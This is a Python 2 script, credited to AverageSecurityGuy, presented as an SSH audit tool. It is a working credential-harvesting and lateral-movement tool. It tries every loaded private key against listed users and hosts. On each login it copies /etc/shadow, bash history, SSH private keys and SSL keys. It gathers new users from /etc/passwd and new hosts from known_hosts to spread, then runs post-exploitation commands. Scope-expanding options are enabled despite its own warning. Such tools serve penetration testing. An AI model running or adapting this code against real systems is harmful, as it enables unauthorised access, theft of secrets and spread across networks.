#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice, this
#   list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors may
#   be used to endorse or promote products derived from this software without
#   specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import os
import re


class ssh:

    def __init__(self, user, key, host):
        self.__user = user
        self.__key = key
        self.__host = host

        # Can we authenticate successfully?
        if self.run_ssh_command('ls') is None:
            self.authenticated = False
        else:
            self.authenticated = True

        # Can we sudo?
        if self.run_ssh_command('sudo ls') is None:
            self.sudo = False
        else:
            self.sudo = True

    def run_ssh_command(self, command, admin=False):
        '''
        Run the specified command. If there is an error return None. If not,
        return the response.
        '''
        if admin is True and self.__user != 'root':
            if self.sudo is True:
                command = 'sudo ' + command
            else:
                print '[-] Admin command failed, user is not root and cannot sudo.'
                return None

        cmd = 'ssh -i {0} {1}@{2} "{3}"'.format(self.__key,
                self.__user, self.__host, command)

        output = os.popen4(cmd)
        resp = output[1].read()

        # Check for common errors and return None
        if resp.find('Permission denied') != -1:
            return None
        if resp.find('not a regular file') != -1:
            return None
        if resp.find('Please login as the user') != -1:
            return None
        if resp.find('Could not resolve hostname') != -1:
            return None
        if resp.find('usage: ssh') != -1:
            return None
        if resp.find('No such file or directory') != -1:
            return None

        # If no errors then return output of command
        return resp

    def __download_file(self, src, dst, admin=False):
        '''
        Download the src file and save it to disk as dst.
        '''
        print '[*] Downloading {0} from {1}'.format(src, self.__host)
        resp = self.run_ssh_command('cat {0}'.format(src), admin)

        if resp is None:
            print '[-] Unable to download file'
            return False
        else:
            dfile = open(dst, 'w')
            dfile.write(resp)
            dfile.close()
            print '[+] File successfully downloaded.'
            return True

    def get_users(self):
        '''
        Read and parse the /etc/passwd file to get new user accounts.
        '''
        print '[*] Getting additional users.'
        users = []
        resp = self.run_ssh_command('cat /etc/passwd')
        if resp is None:
            return []
        for line in resp.split('\n'):
            u = line.split(':')[0]
            users.append(u)

        return users

    def get_hosts(self):
        '''
        Read and parse the .ssh/known_hosts file to get new hosts.
        '''
        print '[*] Getting additional hosts.'
        hosts = []
        resp = self.run_ssh_command('cat .ssh/known_hosts')
        if resp is None:
            return []
        for line in resp.split('\n'):
            h = line.split(' ')[0]
            hosts.append(h)

        return hosts

    def get_shadow(self):
        '''
        Get the /etc/shadow file and save it to disk. Will only work if we
        are root or have sudo ability.
        '''
        print '[*] Getting shadow file from {0}.'.format(self.__host)
        dst = '{0}_shadow'.format(self.__host)
        self.__download_file('/etc/shadow', dst, True)

    def get_history(self):
        '''
        Get the .bash_history file and save it to disk.
        '''
        print '[*] Getting Bash history file from {0}.'.format(self.__host)
        dst = '{0}_{1}_history'.format(self.__host, self.__user)
        self.__download_file('.bash_history', dst, True)

    def get_ssl_keys(self):
        '''
        Download any private SSL keys. Look in the directory specified by
        OPENSSLDIR in the output of the 'openssl version -a' command. only
        download .crt and .key files. Requires root or sudo.
        '''
        print '[*] Getting SSL keys, if any, from {0}'.format(self.__host)
        ssldir = None
        resp = self.run_ssh_command('openssl version -a')
        if resp is not None:
            m = re.search(r'OPENSSLDIR: "(.*)"', resp)
            if m is not None:
                ssldir = m.group(1) + '/certs'
            else:
                print '[-] No SSL directory found.'

        if ssldir is not None:
            print '[+] Searching for SSL keys in {0}.'.format(ssldir)
            resp = self.run_ssh_command('ls {0}'.format(ssldir), True)
            if resp is not None:
                for line in resp.split('\n'):
                    if line.find('.crt') != -1 or line.find('.key') != -1:
                        src = ssldir + '/' + line
                        dst = '{0}_{1}'.format(self.__host, line)
                        self.__download_file(src, dst, True)
            else:
                print '[-] No SSL keys were found.'

    def get_ssh_keys(self):
        '''
        Download the SSH keys in the .ssh directory. Return the list of keys
        found.
        '''
        print '[*] Getting additional SSH keys from {0}'.format(self.__host)
        keys = []
        resp = self.run_ssh_command('ls .ssh')
        for line in resp.split('\n'):
            if line == 'authorized_keys':
                continue
            if line == 'known_hosts':
                continue
            if line == 'config':
                continue
            if line == '':
                continue
            src = '.ssh/{0}'.format(line)
            dst = '{0}_{1}_{2}_sshkey'.format(self.__host, self.__user,
                    line)
            if self.__download_file(src, dst) is True:
                keys.append(line)

        return keys


def audit_ssh(user, key, host):
    '''
    Audit an SSH server. Attempt to authenticate to the host using the user
    and key provided. Attempt to get SSH keys, shadow file, bash_history and
    SSL private keys. Also add new users and hosts if allowed.
    '''
    print '[*] Auditing {0}@{1} with {2}.'.format(user, host, key)
    server = ssh(user, key, host)
    if server.authenticated is True:
        keys.extend(server.get_ssh_keys())
        if add_users is True:
            add_new_users(server.get_users())
        if add_hosts is True:
            add_new_hosts(server.get_hosts())
        server.get_shadow()
        server.get_history()
        server.get_ssl_keys()
        run_post_exploitation(server)
    else:
        print '[-] Unable to login to server.'


def add_new_users(new_users):
    '''
    Add new users to the global users list unless already in the list.
    '''
    for user in new_users:
        if user in users:
            continue
        if user in default_users:
            continue
        if user == '':
            continue
        print '[+] Found new user {0}.'.format(user)
        users.append(user)


def add_new_hosts(new_hosts):
    '''
    Add new hosts to the global hosts list unless already in the list.
    '''
    for host in new_hosts:
        if host in hosts:
            continue
        if host == '':
            continue
        print '[+] Found new host {0}.'.format(host)
        hosts.append(host)


def run_post_exploitation(server):
    '''
    Run post exploitation commands on the server and capture the responses
    in the 'postexploit' file. Failed commands are attempted with sudo if the
    user is not root.
    '''
    print '[*] Running post exploitation commands.'
    pe = open('postexploit', 'w')
    for cmd in post_exploit:
        print '[*] Running command {0}.'.format(cmd)
        pe.write(cmd + '\n')
        resp = server.run_ssh_command(cmd)
        if resp is None:
            print '[-] Command failed trying with sudo.'
            resp = server.run_ssh_command(cmd, True)
            if resp is not None:
                print '[+] Command successful.'
                pe.write(resp + '\n')
            else:
                print '[-] Command unsuccessful.'
                pe.write('\n')
        else:
            print '[+] Command successful.'
            pe.write(resp + '\n')

    pe.close()


def load_keys():
    '''
    Load SSH keys from the current directory.
    '''
    keys = []
    print '[*] Loading SSH keys from current directory.'
    for file in os.listdir('.'):
        if file.endswith('.pub'):
            continue
        if file == 'users':
            continue
        if file == 'hosts':
            continue
        if file == 'postexploit':
            continue
        if file.endswith('_shadow'):
            continue
        if file.endswith('_sshkey'):
            continue
        if file.endswith('_history'):
            continue
        if file == os.path.basename(__file__):
            continue
        keys.append(file)

    return keys


def load_users():
    '''
    Load user accounts from the 'users' file.
    '''
    u = []
    print '[*] Loading user accounts.'
    for line in open('users', 'r'):
        if line == '\n':
            continue
        u.append(line.rstrip())

    return u


def save_users():
    '''
    Update the 'users' file with the newly discovered users if allowed.
    '''
    print '[*] Saving user accounts.'
    u = open('users', 'w')
    u.write('\n'.join(users))
    u.close()


def load_hosts():
    '''
    Load hostnames/IPs from the 'hosts' file.
    '''
    h = []
    print '[*] Loading hosts.'
    for line in open('hosts', 'r'):
        if line == '\n':
            continue
        h.append(line.rstrip())

    return h


def save_hosts():
    '''
    Update the 'hosts' file with newly discovered hosts, if allowed.
    '''
    print '[*] Saving hosts.'
    h = open('hosts', 'w')
    h.write('\n'.join(hosts))
    h.close()


# Main Program
if __name__ == '__main__':
    '''
    CONFIGURATION OPTIONS
    Auto adding users and hosts can cause you to audit users or hosts that
    are not in scope. By default these are set to False. If you don't care,
    then set them to True.

    post_exploit contains a list of commands to run on any SSH servers to
    which we have access.

    default_users is a list of default user accounts that will not be added
    to the list of users if found on a server.
    '''
    add_users = True
    add_hosts = True
    post_exploit = ['ls /home']
    default_users = ['daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp',
                     'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup',
                     'list', 'irc', 'gnats', 'nobody', 'libuuid', 'syslog',
                     'messagebus', 'whoopsie', 'landscape', 'sshd']

    users = load_users()
    hosts = load_hosts()
    keys = load_keys()

    print '[*] Starting SSH audit.'
    for key in keys:
        for user in users:
            for host in hosts:
                audit_ssh(user, key, host)

    if add_users is True:
        save_users()
    if add_hosts is True:
        save_hosts()
